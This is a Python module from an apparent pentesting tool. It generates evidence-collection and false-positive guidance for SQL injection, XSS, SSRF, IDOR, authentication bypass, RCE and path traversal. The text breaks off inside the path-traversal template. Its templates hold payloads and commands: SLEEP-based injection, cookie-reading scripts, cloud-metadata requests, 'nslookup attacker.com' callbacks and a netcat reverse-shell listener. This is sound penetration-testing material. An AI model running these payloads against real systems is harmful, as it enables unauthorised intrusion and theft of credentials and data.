"""
Evidence Collection Framework

Generates actionable evidence collection guidance for security findings.
Helps pentesters prove exploitation and avoid false positives.

For each finding, provides:
- What evidence to capture (screenshots, responses, timing)
- Expected output that proves exploitation worked
- Verification steps to confirm it's not a false positive
- File organization suggestions
"""

import json
import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime

from backend.core.config import settings
from backend.core.logging import get_logger

logger = get_logger(__name__)


class EvidenceType(str, Enum):
    """Types of evidence that can be collected."""
    SCREENSHOT = "screenshot"
    HTTP_REQUEST = "http_request"
    HTTP_RESPONSE = "http_response"
    TIMING_DATA = "timing_data"
    DATABASE_OUTPUT = "database_output"
    FILE_CONTENT = "file_content"
    COMMAND_OUTPUT = "command_output"
    LOG_ENTRY = "log_entry"
    NETWORK_CAPTURE = "network_capture"
    TOKEN_VALUE = "token_value"
    ERROR_MESSAGE = "error_message"
    DATA_SAMPLE = "data_sample"


@dataclass
class EvidenceRequirement:
    """A specific piece of evidence to collect."""
    evidence_type: EvidenceType
    description: str
    capture_method: str
    expected_content: str
    filename_suggestion: str
    priority: str = "Required"  # Required, Recommended, Optional
    tools_needed: List[str] = field(default_factory=list)
    notes: str = ""


@dataclass
class ValidationStep:
    """A step to validate the finding is real (not false positive)."""
    step_number: int
    action: str
    expected_result: str
    if_fails: str  # What it means if this step fails


@dataclass
class ToolVerification:
    """Tool-specific verification command."""
    tool: str
    command_template: str
    expected_output: str
    notes: str = ""


@dataclass
class ProofOfExploitation:
    """
    Defines what constitutes proof of successful exploitation.
    Helps pentesters differentiate true positives from false positives.
    """
    # Minimum evidence needed to prove exploitation
    minimum_evidence: List[str] = field(default_factory=list)

    # What output PROVES exploitation (definitive indicators)
    definitive_proof: List[str] = field(default_factory=list)

    # Outputs that look like success but aren't (common mistakes)
    misleading_outputs: List[str] = field(default_factory=list)

    # How to tell the difference between TP and FP
    differentiation_tips: List[str] = field(default_factory=list)

    # Tool-specific verification commands
    tool_verifications: List[ToolVerification] = field(default_factory=list)

    # What NOT to report as exploited (common over-reporting)
    do_not_report_as_exploited: List[str] = field(default_factory=list)

    # Impact demonstration requirements
    impact_proof_requirements: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "minimum_evidence": self.minimum_evidence,
            "definitive_proof": self.definitive_proof,
            "misleading_outputs": self.misleading_outputs,
            "differentiation_tips": self.differentiation_tips,
            "tool_verifications": [
                {
                    "tool": tv.tool,
                    "command": tv.command_template,
                    "expected": tv.expected_output,
                    "notes": tv.notes,
                }
                for tv in self.tool_verifications
            ],
            "do_not_report_as_exploited": self.do_not_report_as_exploited,
            "impact_proof_requirements": self.impact_proof_requirements,
        }


@dataclass
class FindingEvidenceGuide:
    """Complete evidence collection guide for a finding."""
    finding_id: str
    finding_title: str
    finding_type: str
    severity: str

    # Evidence to collect
    evidence_requirements: List[EvidenceRequirement] = field(default_factory=list)

    # Validation steps
    validation_steps: List[ValidationStep] = field(default_factory=list)

    # Quick verification command/test
    quick_verify_command: Optional[str] = None
    quick_verify_expected: Optional[str] = None

    # False positive indicators
    false_positive_indicators: List[str] = field(default_factory=list)

    # True positive indicators
    true_positive_indicators: List[str] = field(default_factory=list)

    # Suggested folder structure
    evidence_folder: str = ""

    # Proof of exploitation requirements
    proof_of_exploitation: Optional[ProofOfExploitation] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "finding_title": self.finding_title,
            "finding_type": self.finding_type,
            "severity": self.severity,
            "evidence_requirements": [
                {
                    "type": e.evidence_type.value,
                    "description": e.description,
                    "capture_method": e.capture_method,
                    "expected_content": e.expected_content,
                    "filename": e.filename_suggestion,
                    "priority": e.priority,
                    "tools": e.tools_needed,
                    "notes": e.notes,
                }
                for e in self.evidence_requirements
            ],
            "validation_steps": [
                {
                    "step": v.step_number,
                    "action": v.action,
                    "expected": v.expected_result,
                    "if_fails": v.if_fails,
                }
                for v in self.validation_steps
            ],
            "quick_verify": {
                "command": self.quick_verify_command,
                "expected": self.quick_verify_expected,
            } if self.quick_verify_command else None,
            "false_positive_indicators": self.false_positive_indicators,
            "true_positive_indicators": self.true_positive_indicators,
            "evidence_folder": self.evidence_folder,
            "proof_of_exploitation": self.proof_of_exploitation.to_dict() if self.proof_of_exploitation else None,
        }


# Evidence templates for common vulnerability types
EVIDENCE_TEMPLATES: Dict[str, Dict[str, Any]] = {
    "sql_injection": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Original request with injection payload",
                "capture_method": "Save from Burp Suite Repeater or browser DevTools Network tab",
                "expected_content": "Request containing SQL payload in parameter",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "Browser DevTools"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response showing successful injection",
                "capture_method": "Save response body showing query manipulation evidence",
                "expected_content": "Response with extra data, error message, or timing difference",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "Browser DevTools"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Visual proof of data extraction or error",
                "capture_method": "Screenshot browser/Burp showing the vulnerable response",
                "expected_content": "Visible database error OR extracted data OR behavioral change",
                "filename": "{finding_id}_screenshot.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
            {
                "type": EvidenceType.TIMING_DATA,
                "description": "Response time comparison (for blind SQLi)",
                "capture_method": "Record response times with and without SLEEP/WAITFOR payload",
                "expected_content": "Injected: ~5s response | Normal: <1s response",
                "filename": "{finding_id}_timing.txt",
                "priority": "Required for blind SQLi",
                "tools": ["Burp Suite Intruder", "curl with time"],
            },
            {
                "type": EvidenceType.DATABASE_OUTPUT,
                "description": "Extracted database content",
                "capture_method": "Save extracted table names, column names, or data",
                "expected_content": "Database schema info or actual data records",
                "filename": "{finding_id}_extracted_data.json",
                "priority": "Recommended",
                "tools": ["sqlmap", "Manual extraction"],
            },
        ],
        "validation": [
            {"action": "Send normal request without payload", "expected": "Normal response (baseline)", "if_fails": "Application may be down"},
            {"action": "Send request with simple quote (') in parameter", "expected": "Error message or different response", "if_fails": "Input may be sanitized - try encoding"},
            {"action": "Send boolean-based payload (AND 1=1 vs AND 1=2)", "expected": "Different responses for true vs false", "if_fails": "May be blind SQLi - try time-based"},
            {"action": "Send time-based payload (SLEEP(5) or WAITFOR)", "expected": "Response delayed by ~5 seconds", "if_fails": "May not be injectable or DB doesn't support"},
            {"action": "Attempt to extract version (@@version, version())", "expected": "Database version in response", "if_fails": "May need different extraction technique"},
        ],
        "quick_verify": "curl -w '\\nTime: %{time_total}s\\n' -X POST '{url}' -d '{param}={value}' AND SLEEP(5)--'",
        "quick_verify_expected": "Response time > 5 seconds indicates successful injection",
        "false_positive_indicators": [
            "Error message appears for ANY special character (generic input validation)",
            "Same 'error' response for clearly invalid SQL syntax",
            "Response time varies randomly regardless of payload",
            "WAF blocking page shown (not actual SQL error)",
        ],
        "true_positive_indicators": [
            "Database-specific error message (MySQL, PostgreSQL, MSSQL syntax)",
            "Different data returned for 1=1 vs 1=2 conditions",
            "Consistent 5+ second delay with SLEEP payload",
            "Actual database content extracted (table names, data)",
            "UNION-based injection returns extra columns",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request containing SQL payload",
                "Response showing different behavior (error, data, or timing)",
                "Screenshot of successful injection",
            ],
            "definitive_proof": [
                "Extracted database version (@@version output)",
                "Extracted table/column names from information_schema",
                "Extracted actual data records from database",
                "Demonstrated ability to write/modify data",
            ],
            "misleading_outputs": [
                "Generic 500 error (may be any application error, not SQLi)",
                "Response contains your input echoed (not necessarily SQLi)",
                "Slow response that's consistently slow (not caused by SLEEP)",
                "WAF blocking message (payload detected but not executed)",
            ],
            "differentiation_tips": [
                "True SQLi: Database-specific error syntax (MySQL vs MSSQL vs PostgreSQL)",
                "True SQLi: Different response for 1=1 vs 1=2 boolean conditions",
                "False positive: Same error for ANY special character (input validation)",
                "False positive: Error message doesn't mention SQL/query/database",
            ],
            "tool_verifications": [
                {"tool": "sqlmap", "command": "sqlmap -u '{url}' --batch --dbs", "expected": "Available databases listed", "notes": "Use --level=5 --risk=3 for thorough testing"},
                {"tool": "curl", "command": "curl -s '{url}' -d \"param=' AND SLEEP(5)--\" -w '\\nTime: %{{time_total}}s'", "expected": "Response time > 5 seconds", "notes": "Compare with baseline response time"},
            ],
            "do_not_report_as_exploited": [
                "Single quote causes error but no data extraction possible",
                "Error-based SQLi without actual data access demonstrated",
                "Time-based SQLi without confirming data access potential",
            ],
            "impact_proof_requirements": [
                "Show specific sensitive data that was extracted",
                "Demonstrate access to data you shouldn't have",
                "If time-based only, show consistent timing difference",
            ],
        },
    },

    "xss": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request containing XSS payload",
                "capture_method": "Save request with injected script tag or event handler",
                "expected_content": "Request with <script>, onerror=, etc.",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "Browser DevTools"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response with unescaped payload",
                "capture_method": "Save HTML source showing payload rendered",
                "expected_content": "Payload appears in HTML without encoding",
                "filename": "{finding_id}_response.html",
                "priority": "Required",
                "tools": ["Burp Suite", "View Source"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Alert box or DOM manipulation proof",
                "capture_method": "Screenshot showing JavaScript executed (alert, console, DOM change)",
                "expected_content": "Alert box with custom message OR console output OR page modification",
                "filename": "{finding_id}_screenshot.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Browser console showing script execution",
                "capture_method": "Screenshot DevTools console with custom output",
                "expected_content": "Console.log output from injected script",
                "filename": "{finding_id}_console.png",
                "priority": "Recommended",
                "tools": ["Browser DevTools"],
            },
        ],
        "validation": [
            {"action": "Inject simple <script>alert(1)</script>", "expected": "Alert box appears", "if_fails": "Script tags may be filtered - try event handlers"},
            {"action": "Try event handler: <img src=x onerror=alert(1)>", "expected": "Alert triggers on image error", "if_fails": "Event handlers filtered - try other vectors"},
            {"action": "Check if payload persists (stored XSS)", "expected": "Payload executes on page reload/other users", "if_fails": "May be reflected only"},
            {"action": "Test with document.cookie payload", "expected": "Cookie values accessible", "if_fails": "HttpOnly flag may be set (still XSS, limited impact)"},
            {"action": "Verify in different browsers", "expected": "Works in Chrome, Firefox, Edge", "if_fails": "Browser-specific filtering"},
        ],
        "quick_verify": "Inject: <script>console.log('XSS-'+document.domain)</script> and check browser console",
        "quick_verify_expected": "Console shows 'XSS-{domain}' proving script execution",
        "false_positive_indicators": [
            "Payload appears in response but is HTML-encoded (&lt;script&gt;)",
            "Payload in response but inside JavaScript string (may need breakout)",
            "CSP blocks script execution (check console for CSP errors)",
            "Alert doesn't fire - script in non-executable context",
        ],
        "true_positive_indicators": [
            "Alert/confirm/prompt box appears with custom content",
            "Console.log output from injected script visible",
            "DOM modified by injected JavaScript",
            "Cookie/session data accessible via document.cookie",
            "Payload persists and fires for other users (stored XSS)",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request with XSS payload",
                "Response showing payload in HTML without encoding",
                "Screenshot of JavaScript execution (alert/console)",
            ],
            "definitive_proof": [
                "Alert box with custom content visible",
                "Browser console showing injected script output",
                "Document.cookie or document.domain accessed",
                "For stored XSS: payload fires in different browser/session",
            ],
            "misleading_outputs": [
                "Payload appears in source but HTML-encoded (&lt;script&gt;)",
                "Payload in response but CSP blocks execution (check console)",
                "Payload in JavaScript string context without breakout",
                "Payload in HTML comment or non-rendered area",
            ],
            "differentiation_tips": [
                "True XSS: Script actually EXECUTES (not just present in source)",
                "True XSS: Can demonstrate cookie theft or DOM manipulation",
                "False positive: Payload present but HTML-encoded in output",
                "False positive: CSP violation error in console = blocked",
            ],
            "tool_verifications": [
                {"tool": "Browser Console", "command": "Check for console.log output from payload", "expected": "Custom message in console", "notes": "Press F12 to open DevTools"},
                {"tool": "XSStrike", "command": "xsstrike -u '{url}' --crawl", "expected": "Confirmed XSS vectors", "notes": "Manual verification still required"},
            ],
            "do_not_report_as_exploited": [
                "Payload reflected but properly HTML-encoded",
                "Payload present but in non-executable context (comment, attribute without event)",
                "Self-XSS that requires victim to paste payload themselves",
            ],
            "impact_proof_requirements": [
                "Show script execution with visual proof (alert or console)",
                "For stored XSS: demonstrate it fires for other users",
                "Show potential impact (cookie theft, keylogging, etc.)",
            ],
        },
    },

    "ssrf": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with internal URL/IP payload",
                "capture_method": "Save request pointing to internal resource",
                "expected_content": "URL parameter pointing to 127.0.0.1, internal IP, or cloud metadata",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response containing internal resource data",
                "capture_method": "Save response showing internal content retrieved",
                "expected_content": "Internal page HTML, metadata API response, or internal service data",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.NETWORK_CAPTURE,
                "description": "Callback to attacker-controlled server",
                "capture_method": "Use Burp Collaborator, webhook.site, or own server",
                "expected_content": "HTTP request from target server to your callback URL",
                "filename": "{finding_id}_callback.txt",
                "priority": "Required for blind SSRF",
                "tools": ["Burp Collaborator", "webhook.site", "netcat"],
            },
            {
                "type": EvidenceType.DATA_SAMPLE,
                "description": "Cloud metadata or internal secrets",
                "capture_method": "Save any AWS keys, internal configs, or credentials found",
                "expected_content": "AWS credentials, internal hostnames, config files",
                "filename": "{finding_id}_secrets.txt",
                "priority": "Critical if found",
                "tools": ["Manual analysis"],
            },
        ],
        "validation": [
            {"action": "Request localhost (127.0.0.1:80)", "expected": "Internal server response or error revealing internal access", "if_fails": "localhost may be blocked - try alternative representations"},
            {"action": "Try internal IP ranges (10.x, 172.16.x, 192.168.x)", "expected": "Access to internal network resources", "if_fails": "Internal ranges may be blocked"},
            {"action": "Request cloud metadata (169.254.169.254)", "expected": "AWS/GCP/Azure metadata response", "if_fails": "Not cloud-hosted or metadata blocked"},
            {"action": "Use Burp Collaborator/webhook callback", "expected": "HTTP callback received from target", "if_fails": "Outbound requests may be blocked"},
            {"action": "Try file:// protocol", "expected": "Local file content returned", "if_fails": "Protocol may be restricted to http/https"},
        ],
        "quick_verify": "Set URL param to http://your-collaborator-id.burpcollaborator.net and check for callback",
        "quick_verify_expected": "HTTP request received at Collaborator from target server IP",
        "false_positive_indicators": [
            "Error message but no actual request made (URL validation only)",
            "Timeout without callback (may be blocked outbound)",
            "Generic error for all URLs (not actually fetching)",
            "Response is cached/static (not real-time fetch)",
        ],
        "true_positive_indicators": [
            "Internal page content returned (different from external)",
            "Cloud metadata (IAM roles, instance IDs, credentials)",
            "Callback received at attacker server from target IP",
            "Internal error messages revealing architecture",
            "Port scan results (different responses per port)",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request pointing to internal resource",
                "Response showing internal content OR callback received",
            ],
            "definitive_proof": [
                "Cloud metadata retrieved (169.254.169.254 response)",
                "Internal service content returned (localhost, internal IP)",
                "Callback received at Burp Collaborator from target server",
                "Internal credentials or secrets exposed",
            ],
            "misleading_outputs": [
                "Error message mentioning URL but no actual fetch",
                "Timeout without callback (may be blocked outbound)",
                "Response is cached/static content",
                "DNS resolution error (no actual request made)",
            ],
            "differentiation_tips": [
                "True SSRF: Different content for internal vs external URLs",
                "True SSRF: Callback received from TARGET IP (not your own)",
                "False positive: Error for all non-standard URLs (validation only)",
                "False positive: Response doesn't change based on URL",
            ],
            "tool_verifications": [
                {"tool": "Burp Collaborator", "command": "Use Collaborator URL as payload", "expected": "HTTP/DNS callback from target", "notes": "Check Collaborator tab for interactions"},
                {"tool": "curl", "command": "Test with file:///etc/passwd payload", "expected": "File contents if protocol allowed", "notes": "Try different protocols: file, gopher, dict"},
            ],
            "do_not_report_as_exploited": [
                "URL validation error without actual request made",
                "Only affects same-origin requests (not true SSRF)",
                "Can only reach public URLs (no internal access)",
            ],
            "impact_proof_requirements": [
                "Show access to internal-only resources",
                "For cloud: show metadata endpoint access",
                "Demonstrate actual data exfiltration capability",
            ],
        },
    },

    "idor": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with manipulated object ID",
                "capture_method": "Save request with changed ID parameter",
                "expected_content": "Request accessing another user's resource ID",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response containing other user's data",
                "capture_method": "Save response showing unauthorized data access",
                "expected_content": "Another user's profile, order, document, etc.",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Side-by-side comparison (your data vs other's)",
                "capture_method": "Screenshot showing you accessed another user's data",
                "expected_content": "Clear evidence of different user's information",
                "filename": "{finding_id}_comparison.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
            {
                "type": EvidenceType.DATA_SAMPLE,
                "description": "Sample of accessed data (redacted)",
                "capture_method": "Export sample showing data you shouldn't access",
                "expected_content": "Other user's PII, orders, messages (redact sensitive parts)",
                "filename": "{finding_id}_data_sample.json",
                "priority": "Recommended",
                "tools": ["Manual extraction"],
            },
        ],
        "validation": [
            {"action": "Note your own user ID and resource IDs", "expected": "Baseline of your own data", "if_fails": "N/A"},
            {"action": "Change ID to another user's (ID+1, ID-1)", "expected": "Access to their data without authorization", "if_fails": "IDs may not be sequential - try enumeration"},
            {"action": "Try ID=1 (often admin or first user)", "expected": "Admin or privileged user data", "if_fails": "First user may be protected differently"},
            {"action": "Test with logged-out session", "expected": "Same access (broken access control)", "if_fails": "Authentication may be required but authorization missing"},
            {"action": "Test horizontal (same role) vs vertical (higher role)", "expected": "Access to peer data and/or admin data", "if_fails": "May only be one type of IDOR"},
        ],
        "quick_verify": "Change /api/users/123/profile to /api/users/124/profile (different user's ID)",
        "quick_verify_expected": "Receive user 124's profile data while authenticated as user 123",
        "false_positive_indicators": [
            "403 Forbidden returned (authorization working)",
            "Empty response or 'not found' for other IDs",
            "Same response regardless of ID (public data)",
            "Redirected to own profile (ID ignored)",
        ],
        "true_positive_indicators": [
            "Different user's data returned",
            "Can enumerate all users by incrementing ID",
            "Can access admin resources with regular user session",
            "Can modify other user's data (IDOR + write access)",
            "UUID doesn't protect - can discover/enumerate UUIDs",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request showing your session accessing another user's ID",
                "Response containing another user's data",
                "Clear evidence data belongs to different user",
            ],
            "definitive_proof": [
                "Two sessions: User A and User B, User A accessing B's data",
                "Different user's PII (email, name) visible",
                "Can enumerate multiple users' data systematically",
                "Can modify another user's resources",
            ],
            "misleading_outputs": [
                "Response returns YOUR data regardless of ID (ID ignored)",
                "404/403 for other IDs (access control working)",
                "Data is intentionally public (not private)",
                "Response structure changes but data is generic",
            ],
            "differentiation_tips": [
                "True IDOR: Data clearly belongs to DIFFERENT user",
                "True IDOR: Can demonstrate access to multiple users",
                "False positive: Same data returned regardless of ID",
                "False positive: 403 Forbidden for other IDs = working ACL",
            ],
            "tool_verifications": [
                {"tool": "Burp Intruder", "command": "Enumerate IDs with payload list 1-1000", "expected": "Different data for different IDs", "notes": "Compare response bodies for differences"},
                {"tool": "Autorize", "command": "Compare authorized vs unauthorized access", "expected": "Same response with low-priv user", "notes": "Burp extension for access control testing"},
            ],
            "do_not_report_as_exploited": [
                "Access control returns 403 for other users' IDs",
                "Data is same/public regardless of ID",
                "Only affects your own data with different ID format",
            ],
            "impact_proof_requirements": [
                "Show data from at least 2 different users accessed",
                "Demonstrate the data should be private",
                "If write IDOR: show modification of another user's data",
            ],
        },
    },

    "authentication_bypass": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request achieving unauthorized access",
                "capture_method": "Save request that bypasses authentication",
                "expected_content": "Request without valid credentials accessing protected resource",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response granting unauthorized access",
                "capture_method": "Save response showing successful bypass",
                "expected_content": "Protected content returned without proper auth",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Authenticated page accessed without login",
                "capture_method": "Screenshot showing protected content",
                "expected_content": "Admin panel, user dashboard, or protected data visible",
                "filename": "{finding_id}_screenshot.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
            {
                "type": EvidenceType.TOKEN_VALUE,
                "description": "Forged or manipulated authentication token",
                "capture_method": "Save the crafted JWT, session token, or cookie",
                "expected_content": "Modified token that grants elevated access",
                "filename": "{finding_id}_token.txt",
                "priority": "If applicable",
                "tools": ["jwt.io", "Burp Suite"],
            },
        ],
        "validation": [
            {"action": "Access protected endpoint without any auth", "expected": "403/401 (baseline)", "if_fails": "Endpoint may be public"},
            {"action": "Try common bypass headers (X-Forwarded-For: 127.0.0.1)", "expected": "Access granted with header", "if_fails": "Header bypass not present"},
            {"action": "Manipulate JWT (change role, remove signature)", "expected": "Elevated access with modified token", "if_fails": "JWT properly validated"},
            {"action": "Test path traversal (/admin/../admin)", "expected": "Bypass path-based restrictions", "if_fails": "Path normalized correctly"},
            {"action": "Try HTTP verb tampering (GET vs POST vs PUT)", "expected": "Different verb bypasses check", "if_fails": "All verbs validated"},
        ],
        "quick_verify": "Access /admin endpoint with: 1) no auth, 2) regular user auth, 3) manipulated auth",
        "quick_verify_expected": "One of the above grants admin access without proper credentials",
        "false_positive_indicators": [
            "Still requires valid session (just missing role check)",
            "Returns login page HTML but 200 status (not actual bypass)",
            "Cached response from previous authenticated session",
            "Public endpoint mistaken for protected",
        ],
        "true_positive_indicators": [
            "Protected functionality accessible without authentication",
            "Admin functions available to regular users",
            "JWT 'none' algorithm accepted",
            "Session fixation allows hijacking",
            "Password reset token predictable/reusable",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request achieving unauthorized access",
                "Response showing protected content",
                "Proof the user shouldn't have access (permission context)",
            ],
            "definitive_proof": [
                "Access to admin panel without admin credentials",
                "Performing admin action (create user, change settings)",
                "Accessing protected API without valid token",
                "JWT manipulation accepted by server",
            ],
            "misleading_outputs": [
                "Login page returns 200 but requires actual auth",
                "Cached response from previous authenticated session",
                "Public endpoint mistaken for protected",
                "HTML content returned but actually login redirect",
            ],
            "differentiation_tips": [
                "True bypass: Can perform ACTIONS not just view pages",
                "True bypass: Works consistently, not cached response",
                "False positive: Response looks like success but check Set-Cookie",
                "False positive: Redirects to login on subsequent actions",
            ],
            "tool_verifications": [
                {"tool": "Burp", "command": "Remove/modify Authorization header", "expected": "Still access protected resource", "notes": "Compare authenticated vs unauthenticated responses"},
                {"tool": "jwt.io", "command": "Modify JWT payload, try 'none' algorithm", "expected": "Modified token accepted", "notes": "Check if signature actually validated"},
            ],
            "do_not_report_as_exploited": [
                "Getting 200 OK but content is login page",
                "Accessing truly public endpoints",
                "Session expiry vs authentication bypass",
            ],
            "impact_proof_requirements": [
                "Demonstrate access to data/functions you shouldn't have",
                "Show this works for any unauthenticated user",
                "Demonstrate impact (what can attacker do?)",
            ],
        },
    },

    "rce": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request containing command injection payload",
                "capture_method": "Save request with injected OS command",
                "expected_content": "Request with ; id, | whoami, or similar payload",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response showing command output",
                "capture_method": "Save response containing command execution result",
                "expected_content": "Output of id, whoami, hostname, or injected command",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.COMMAND_OUTPUT,
                "description": "Proof of code execution (id, whoami, hostname)",
                "capture_method": "Extract and save the command output",
                "expected_content": "uid=xxx(user) gid=xxx | username | hostname",
                "filename": "{finding_id}_command_output.txt",
                "priority": "Required",
                "tools": ["Manual extraction"],
            },
            {
                "type": EvidenceType.NETWORK_CAPTURE,
                "description": "Reverse shell or callback proof",
                "capture_method": "Capture callback to attacker listener",
                "expected_content": "Connection received from target server",
                "filename": "{finding_id}_callback.txt",
                "priority": "For blind RCE",
                "tools": ["netcat", "Burp Collaborator"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Terminal showing received shell",
                "capture_method": "Screenshot of shell access obtained",
                "expected_content": "Interactive shell prompt from target",
                "filename": "{finding_id}_shell.png",
                "priority": "If shell obtained",
                "tools": ["Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Inject simple command (id, whoami)", "expected": "Command output in response", "if_fails": "Try different injection points or encoding"},
            {"action": "Test time-based (sleep 5, ping -c 5)", "expected": "5 second delay in response", "if_fails": "Command may not execute or different OS"},
            {"action": "Test DNS callback (nslookup attacker.com)", "expected": "DNS query received at your server", "if_fails": "Outbound DNS may be blocked"},
            {"action": "Test HTTP callback (curl/wget to your server)", "expected": "HTTP request received from target", "if_fails": "Outbound HTTP may be blocked"},
            {"action": "Attempt file read (cat /etc/passwd)", "expected": "File contents in response", "if_fails": "May have limited shell or chroot"},
        ],
        "quick_verify": "Inject: ; sleep 5 ; OR | ping -c 5 127.0.0.1 | and measure response time",
        "quick_verify_expected": "Response takes 5+ seconds longer than normal",
        "false_positive_indicators": [
            "Error message about invalid command (input reaches shell but fails)",
            "Same response regardless of command (not executing)",
            "Delay but no callback (could be other causes)",
            "Output looks like command but is user-controlled echo",
        ],
        "true_positive_indicators": [
            "Command output visible (uid, username, hostname)",
            "Consistent delay with sleep command",
            "Callback received (DNS, HTTP) from target IP",
            "Can read system files (/etc/passwd)",
            "Reverse shell connection established",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request with command injection payload",
                "Evidence of command execution (output, timing, or callback)",
            ],
            "definitive_proof": [
                "Command output visible in response (id, whoami, hostname)",
                "Callback received from target (DNS lookup, HTTP request)",
                "File created/modified on target system",
                "Reverse shell connection established",
            ],
            "misleading_outputs": [
                "Error message containing command (echo, not execution)",
                "Random delay that's not caused by sleep command",
                "Callback from your IP not target (misconfigured test)",
                "Command string reflected but not executed",
            ],
            "differentiation_tips": [
                "True RCE: Output is FROM the command (uid=, hostname value)",
                "True RCE: Callback source IP is TARGET server",
                "True RCE: Consistent timing with sleep (test multiple times)",
                "False positive: Command echoed but exit code is error",
            ],
            "tool_verifications": [
                {"tool": "Burp Collaborator", "command": "Inject: ; nslookup COLLAB-ID.burpcollaborator.net", "expected": "DNS query from target IP", "notes": "Check Collaborator for interaction from target"},
                {"tool": "curl", "command": "curl -w '\\nTime: %{{time_total}}s' '{url}' -d 'param=; sleep 5'", "expected": "5+ second response time", "notes": "Compare with baseline"},
                {"tool": "netcat", "command": "nc -lvp 4444 (listener) + inject reverse shell", "expected": "Shell connection received", "notes": "Use appropriate reverse shell for target OS"},
            ],
            "do_not_report_as_exploited": [
                "Command string appears in error but doesn't execute",
                "Can only inject into non-executed context",
                "Sandbox prevents actual command execution",
            ],
            "impact_proof_requirements": [
                "Show actual command output (not just timing)",
                "Demonstrate what access level achieved (user, root)",
                "Show potential for data access or lateral movement",
            ],
        },
    },

    "path_traversal": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with directory traversal payload",
                "capture_method": "Save request with ../ sequences",
                "expected_content": "Request with ../../etc/passwd or similar",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response containing file contents",
                "capture_method": "Save response with accessed file data",
                "expected_content": "Contents of /etc/passwd, web.config, or other file",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.FILE_CONTENT,
                "description": "Sensitive file contents extracted",
                "capture_method": "Save the actual file contents retrieved",
                "expected_content": "System file, config file, or source code",
                "filename": "{finding_id}_file_contents.txt",
                "priority": "Required",
                "tools": ["Manual extraction"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Visual proof of file access",
                "capture_method": "Screenshot showing sensitive file in response",
                "expected_content": "/etc/passwd entries or config file visible",
                "filename": "{finding_id}_screenshot.png",
                "priority": "Recommended",
                "tools": ["Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Try ../../etc/passwd (Linux)", "expected": "User list from passwd file", "if_fails": "May be Windows or path filtered"},
            {"action": "Try ..\\..\\windows\\system.ini (Windows)", "expected": "Windows system file contents", "if_fails": "May be Linux or path filtered"},
            {"action": "Try URL encoding (%2e%2e%2f)", "expected": "Bypass basic filtering", "if_fails": "Encoding also filtered"},
            {"action": "Try null byte (..%00.jpg)", "expected": "Bypass extension checks", "if_fails": "Null byte handled correctly"},
            {"action": "Try double encoding (%252e%252e%252f)", "expected": "Bypass single-decode filter", "if_fails": "Double encoding filtered"},
        ],
        "quick_verify": "Request: /download?file=../../../etc/passwd",
        "quick_verify_expected": "Response contains 'root:x:0:0:' (passwd file format)",
        "false_positive_indicators": [
            "404 Not Found (path blocked, not traversed)",
            "Same error for any traversal attempt (generic filtering)",
            "Returns default file regardless of path",
            "'../'' removed but no file access (filter working)",
        ],
        "true_positive_indicators": [
            "System file contents returned (passwd, hosts, web.config)",
            "Application config files readable (db credentials)",
